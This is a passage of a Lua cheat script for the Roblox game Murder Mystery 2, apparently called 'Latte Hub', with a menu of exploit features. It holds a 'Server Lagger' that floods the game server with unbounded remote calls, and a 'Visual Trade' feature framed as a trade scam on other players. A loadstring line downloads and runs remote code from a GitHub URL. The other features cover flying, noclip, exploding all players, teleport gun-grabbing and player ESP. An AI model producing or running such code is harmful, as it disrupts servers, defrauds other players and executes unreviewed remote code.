            WindUI:Notify({
                Title = "‚ùå Visual Weapons Error",
                Content = "Failed to change weapon visual! üé≠"
            })
        end
    end
})
end

-- */  Protection Tab  /* --
do
    -- Trade Scam Section
    ProtectionTab:Section({
        Title = "üõ°Ô∏è Trade Scam Protection",
        TextSize = isMobile and 16 or 18,
        FontWeight = Enum.FontWeight.SemiBold,
    })
    
local visualTradeEnabled = false

    ProtectionTab:Toggle({
        Flag = "VisualTrade",
        Title = "üîÑ Toggle Visual Trade",
        Desc = "Enable/disable visual trade mode",
    Default = false,
        Callback = function(state)
            visualTradeEnabled = state
            WindUI:Notify({
                Title = "üîÑ Visual Trade",
                Content = visualTradeEnabled and "Visual Trade Enabled! üõ°Ô∏è" or "Visual Trade Disabled! üõ°Ô∏è"
        })
    end
})

    ProtectionTab:Button({
        Title = "üõ°Ô∏è Start Visual Trade",
        Color = PurpleTheme.Error,
        Icon = "shield",
        Callback = function()
        if not visualTradeEnabled then
                WindUI:Notify({
                    Title = "‚ùå Visual Trade Error",
                    Content = "Please enable Visual Trade first! üõ°Ô∏è"
            })
            return
        end
        
            if game:GetService("Players").LocalPlayer.PlayerGui.TradeGUI.Enabled == true or game:GetService("Players").LocalPlayer.PlayerGui.TradeGUI_Phone.Enabled == true then
                task.wait(1)
                WindUI:Notify({
                    Title = "üõ°Ô∏è Trade Scam Active",
                    Content = "Items In Trade Are Now Visual, Remove All Items! üõ°Ô∏è"
                })
            else
                WindUI:Notify({
                    Title = "‚ùå Trade Scam Error",
                    Content = "You Need To Be In Trade For This To Work! üõ°Ô∏è"
                })
            end
    end
})

    ProtectionTab:Space()
    
    -- Anti Stealer Section
    ProtectionTab:Section({
        Title = "üîí Anti Stealer Protection",
        TextSize = isMobile and 16 or 18,
        FontWeight = Enum.FontWeight.SemiBold,
    })
    
    local antiStealerEnabled = false
    local tradeScamProtectionEnabled = false
    
    ProtectionTab:Toggle({
        Flag = "AntiStealer",
        Title = "üîí Enable Anti Stealer",
        Desc = "Enable anti-stealer protection",
    Default = false,
        Callback = function(state)
            antiStealerEnabled = state
            WindUI:Notify({
                Title = "üîí Anti Stealer",
                Content = state and "Script protection is now active! üîí" or "Script protection has been turned off! üîí"
            })
    end
})

    ProtectionTab:Toggle({
        Flag = "TradeScamProtection",
        Title = "üõ°Ô∏è Trade Scam Protection",
        Desc = "Protect against trade scams",
    Default = false,
        Callback = function(state)
            tradeScamProtectionEnabled = state
            WindUI:Notify({
                Title = "üõ°Ô∏è Trade Scam Protection",
                Content = state and "You are now protected against trade scams! üõ°Ô∏è" or "Trade scam protection has been turned off! üõ°Ô∏è"
            })
    end
})

    ProtectionTab:Space()
    
    -- Server Lagger Section
    ProtectionTab:Section({
        Title = "‚ö° Server Lagger",
        TextSize = isMobile and 16 or 18,
        FontWeight = Enum.FontWeight.SemiBold,
    })
    
    ProtectionTab:Button({
        Title = "‚ö° Start Server Lag",
        Color = PurpleTheme.Error,
        Icon = "zap",
        Callback = function()
            WindUI:Notify({
                Title = "‚ö° Server Lagger",
                Content = "Server Is Now In Lagging, There Is A Chance To Be Disconnected! ‚ö°"
        })
        
        local success = pcall(function()
            local e = game:GetService("ReplicatedStorage").GetSyncData
            local InvokeServer = e.InvokeServer
            local spawn = task.spawn
            local a = 0;
            while 1 do
                for i=1, 1 do
                    spawn(InvokeServer, e)
                end
                a = a + 1
                if a == 3 then
                    a = 0
                        task.wait(0)
                end
            end
        end)
        
        if not success then
                WindUI:Notify({
                    Title = "‚ùå Server Lagger Error",
                    Content = "Failed to start server lag! ‚ö°"
            })
        end
    end
})

    ProtectionTab:Space()
    
    -- Anti AFK Section
    ProtectionTab:Section({
        Title = "üåô Anti AFK Protection",
        TextSize = isMobile and 16 or 18,
        FontWeight = Enum.FontWeight.SemiBold,
    })
    
    ProtectionTab:Button({
        Title = "üåô Enable Anti AFK",
        Color = PurpleTheme.Primary,
        Icon = "moon",
        Callback = function()
        local success = pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/hassanxzayn-lua/Anti-afk/main/antiafkbyhassanxzyn"))()
        end)
        
        if success then
                WindUI:Notify({
                    Title = "üåô Anti AFK",
                    Content = "Anti AFK script executed successfully! üåô"
            })
        else
                WindUI:Notify({
                    Title = "‚ùå Anti AFK Error",
                    Content = "Failed to load Anti AFK script! üåô"
            })
        end
    end
})

    ProtectionTab:Section({
        Title = "‚ÑπÔ∏è About Anti AFK",
        TextSize = isMobile and 12 or 14,
        TextTransparency = 0.3,
    })
    
    ProtectionTab:Section({
        Title = "This feature prevents you from being kicked for inactivity. Click the button above to activate anti-AFK protection.",
        TextSize = isMobile and 10 or 12,
        TextTransparency = 0.5,
    })
end

-- */  Advanced Tab  /* --
do
    -- Advanced Features Section
    AdvancedTab:Section({
        Title = "‚ö° Advanced Features",
        TextSize = isMobile and 16 or 18,
        FontWeight = Enum.FontWeight.SemiBold,
    })
    
    local flyEnabled = false
    local flySpeed = 50
    local noclipEnabled = false
    local rainbowCharacter = false
    local screenShake = false
    local particleEffects = false
    local currentGravity = 196.2
    
    AdvancedTab:Toggle({
        Flag = "FlyMode",
        Title = "‚úàÔ∏è Fly Mode",
        Desc = "Enable fly mode (WASD + Space/Shift)",
        Default = false,
        Callback = function(state)
            flyEnabled = state
            WindUI:Notify({
                Title = "‚úàÔ∏è Fly Mode",
                Content = state and "Fly mode enabled! Use WASD to move! ‚úàÔ∏è" or "Fly mode disabled! ‚úàÔ∏è"
            })
        end
    })

    AdvancedTab:Slider({
        Flag = "FlySpeed",
        Title = "üöÄ Fly Speed",
        Desc = "Set fly speed",
        Step = 1,
        Value = {
            Min = 10,
            Max = 200,
            Default = 50,
        },
        Callback = function(value)
            flySpeed = value
        end
    })

    AdvancedTab:Toggle({
        Flag = "Noclip",
        Title = "üëª Noclip",
        Desc = "Walk through walls",
        Default = false,
        Callback = function(state)
            noclipEnabled = state
            WindUI:Notify({
                Title = "üëª Noclip",
                Content = state and "Noclip enabled! üëª" or "Noclip disabled! üëª"
            })
        end
    })

    AdvancedTab:Toggle({
        Flag = "RainbowCharacter",
        Title = "üåà Rainbow Character",
        Desc = "Make your character cycle through rainbow colors",
        Default = false,
        Callback = function(state)
            rainbowCharacter = state
            WindUI:Notify({
                Title = "üåà Rainbow Character",
                Content = state and "Rainbow character enabled! üåà" or "Rainbow character disabled! üåà"
            })
        end
    })

    AdvancedTab:Slider({
        Flag = "CharacterSize",
        Title = "üìè Character Size",
        Desc = "Change your character's size",
        Step = 0.1,
        Value = {
            Min = 0.1,
            Max = 5,
            Default = 1,
        },
        Callback = function(value)
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                LocalPlayer.Character.Humanoid.HipHeight = value
                LocalPlayer.Character.Humanoid.WalkSpeed = 16 * value
                WindUI:Notify({
                    Title = "üìè Size Changer",
                    Content = "Character size set to " .. value .. "! üìè"
                })
            end
        end
    })

    AdvancedTab:Slider({
        Flag = "Gravity",
        Title = "üåç Gravity",
        Desc = "Change world gravity",
        Step = 1,
        Value = {
            Min = 0,
            Max = 500,
            Default = 196,
        },
        Callback = function(value)
            currentGravity = value
            workspace.Gravity = value
            WindUI:Notify({
                Title = "üåç Gravity Changer",
                Content = "Gravity set to " .. value .. "! üåç"
            })
        end
    })

    AdvancedTab:Button({
        Title = "üîÑ Reset Gravity",
        Color = PurpleTheme.Primary,
        Icon = "refresh-cw",
        Callback = function()
            workspace.Gravity = 196.2
            WindUI:Notify({
                Title = "üîÑ Gravity Reset",
                Content = "Gravity reset to normal! üåç"
            })
        end
    })

    AdvancedTab:Toggle({
        Flag = "ScreenShake",
        Title = "üì≥ Screen Shake",
        Desc = "Add screen shake effects",
        Default = false,
        Callback = function(state)
            screenShake = state
            WindUI:Notify({
                Title = "üì≥ Screen Shake",
                Content = state and "Screen shake enabled! üì≥" or "Screen shake disabled! üì≥"
            })
        end
    })

    AdvancedTab:Button({
        Title = "üí• Explode Everyone",
        Color = PurpleTheme.Error,
        Icon = "zap",
        Callback = function()
            WindUI:Notify({
                Title = "üí• Explosion",
                Content = "Creating explosions around all players! üí•"
            })
        
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                    local explosion = Instance.new("Explosion")
                    explosion.Position = player.Character.HumanoidRootPart.Position
                    explosion.BlastRadius = 50
                    explosion.BlastPressure = 1000000
                    explosion.Parent = workspace
                end
            end
        end
    })
end

-- Advanced Features Implementation
local flyBodyVelocity = nil
local flyBodyPosition = nil

local function startFly()
    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then return end
    
    local rootPart = LocalPlayer.Character.HumanoidRootPart
    
    flyBodyVelocity = Instance.new("BodyVelocity")
    flyBodyVelocity.MaxForce = Vector3.new(4000, 4000, 4000)
    flyBodyVelocity.Velocity = Vector3.new(0, 0, 0)
    flyBodyVelocity.Parent = rootPart
    
    flyBodyPosition = Instance.new("BodyPosition")
    flyBodyPosition.MaxForce = Vector3.new(4000, 4000, 4000)
    flyBodyPosition.Position = rootPart.Position
    flyBodyPosition.Parent = rootPart
end

local function stopFly()
    if flyBodyVelocity then
        flyBodyVelocity:Destroy()
        flyBodyVelocity = nil
    end
    if flyBodyPosition then
        flyBodyPosition:Destroy()
        flyBodyPosition = nil
    end
end

-- Fly Controls
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed or not flyEnabled then return end
    
    local rootPart = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not rootPart or not flyBodyVelocity then return end
    
    local camera = workspace.CurrentCamera
    local moveVector = Vector3.new(0, 0, 0)
    
    if input.KeyCode == Enum.KeyCode.W then
        moveVector = moveVector + camera.CFrame.LookVector
    elseif input.KeyCode == Enum.KeyCode.S then
        moveVector = moveVector - camera.CFrame.LookVector
    elseif input.KeyCode == Enum.KeyCode.A then
        moveVector = moveVector - camera.CFrame.RightVector
    elseif input.KeyCode == Enum.KeyCode.D then
        moveVector = moveVector + camera.CFrame.RightVector
    elseif input.KeyCode == Enum.KeyCode.Space then
        moveVector = moveVector + Vector3.new(0, 1, 0)
    elseif input.KeyCode == Enum.KeyCode.LeftShift then
        moveVector = moveVector - Vector3.new(0, 1, 0)
    end
    
    flyBodyVelocity.Velocity = moveVector * flySpeed
end)

-- Noclip System
local function noclipLoop()
    if noclipEnabled and LocalPlayer.Character then
        for _, part in pairs(LocalPlayer.Character:GetChildren()) do
            if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
                part.CanCollide = false
            end
        end
    end
end

-- Rainbow Character
local function rainbowCharacterLoop()
    if rainbowCharacter and LocalPlayer.Character then
        local hue = tick() % 10 / 10
        local color = Color3.fromHSV(hue, 1, 1)
        
        for _, part in pairs(LocalPlayer.Character:GetChildren()) do
            if part:IsA("BasePart") and part:FindFirstChild("Color") then
                part.Color = color
            end
        end
    end
end

-- Screen Shake Effect
local function screenShakeLoop()
    if screenShake and workspace.CurrentCamera then
        local camera = workspace.CurrentCamera
        local shake = math.sin(tick() * 20) * 2
        camera.CFrame = camera.CFrame * CFrame.new(shake, shake, 0)
    end
end

-- Role-specific Functions (Innocent, Murder, Sheriff)
local GunSystem = {
    AutoGrabEnabled = false,
    NotifyGunDrop = true,
    GunDropCheckInterval = 1,
    ActiveGunDrops = {},
    GunDropHighlights = {}
}

local mapPaths = {
    "ResearchFacility", "Hospital3", "MilBase", "House2", "Workplace",
    "Mansion2", "BioLab", "Hotel", "Factory", "Bank2", "PoliceStation"
}

local function ScanForGunDrops()
    GunSystem.ActiveGunDrops = {};
    for _, mapName in ipairs(mapPaths) do
        local map = workspace:FindFirstChild(mapName);
        if map then
            local gunDrop = map:FindFirstChild("GunDrop");
            if gunDrop then
                table.insert(GunSystem.ActiveGunDrops, gunDrop);
            end
        end
    end
    local rootGunDrop = workspace:FindFirstChild("GunDrop");
    if rootGunDrop then
        table.insert(GunSystem.ActiveGunDrops, rootGunDrop);
                    end
                end
                
local function GrabGun(gunDrop)
    if not gunDrop then
        ScanForGunDrops();
        if #GunSystem.ActiveGunDrops == 0 then
            WindUI:Notify({
                Title = "Gun System",
                Content = "No guns available on the map! üî´"
            });
            return false;
        end
        local nearestGun = nil;
        local minDistance = math.huge;
        local character = LocalPlayer.Character;
        local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart");
        if humanoidRootPart then
            for _, drop in ipairs(GunSystem.ActiveGunDrops) do
                local distance = (humanoidRootPart.Position - drop.Position).Magnitude;
                if distance < minDistance then
                    nearestGun = drop;
                    minDistance = distance;
                    end
                end
            end
        gunDrop = nearestGun;
    end
    if (gunDrop and LocalPlayer.Character) then
        local humanoidRootPart = LocalPlayer.Character:FindFirstChild("HumanoidRootPart");
        if humanoidRootPart then
            humanoidRootPart.CFrame = gunDrop.CFrame;
            task.wait(0.3);
            local prompt = gunDrop:FindFirstChildOfClass("ProximityPrompt");
            if prompt then
                fireproximityprompt(prompt);
                WindUI:Notify({
                    Title = "Gun System",
                    Content = "Successfully grabbed the gun! üî´"
                });
                return true;
            end
        end
    end
    return false;
end

-- Main Loop
RunService.Heartbeat:Connect(function()
    -- Fly system
    if flyEnabled then
        if not flyBodyVelocity then
            startFly()
        end
    else
        if flyBodyVelocity then
            stopFly()
        end
    end
    
    -- Noclip
    noclipLoop()
    
    -- Rainbow character
    rainbowCharacterLoop()
    
    -- Screen shake
    screenShakeLoop()
    
    -- Update character settings
    updateCharacter()
end)

-- Connect ESP updates
RunService.RenderStepped:Connect(function()
    if not lineESPEnabled then return end
    for player, line in pairs(tracers) do
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local hrp = player.Character.HumanoidRootPart
            local screenPos, onScreen = workspace.CurrentCamera:WorldToViewportPoint(hrp.Position)
            local rootGuiSize = workspace.CurrentCamera.ViewportSize
            if onScreen then
                line.From = Vector2.new(rootGuiSize.X / 2, rootGuiSize.Y)
                line.To = Vector2.new(screenPos.X, screenPos.Y)
                line.Visible = true
            else
                line.Visible = false
            end
        else
            line.Visible = false
        end
    end
end)

-- Monitor player changes for ESP
local function monitorPlayer(player)
    player.CharacterAdded:Connect(function()
        local backpack = player:WaitForChild("Backpack")
        backpack.ChildAdded:Connect(updateESP)
        backpack.ChildRemoved:Connect(updateESP)
        updateESP()
    end)

    if player.Character then
        local backpack = player:FindFirstChild("Backpack")
        if backpack then
            backpack.ChildAdded:Connect(updateESP)
            backpack.ChildRemoved:Connect(updateESP)
        end
    end
end

for _, player in ipairs(Players:GetPlayers()) do monitorPlayer(player) end
Players.PlayerAdded:Connect(monitorPlayer)

-- Player removal handling
Players.PlayerRemoving:Connect(function(player)
    if player == LocalPlayer then
        for _, line in pairs(tracers) do
            if line then line:Remove() end
        end
        tracers = {}
    end
end)

-- Initialize ESP
updateESP()

-- Config setup
local ConfigManager = Window.ConfigManager
local ConfigName = "latte_config"

-- Save config
Window.CurrentConfig = ConfigManager:CreateConfig(ConfigName)
Window.CurrentConfig:Save()

WindUI:Notify({
    Title = "Latte Hub Loaded!",
    Content = "Welcome to the Halloween edition! Murder Mystery 2 Halloween Update!",
    Time = 5
})
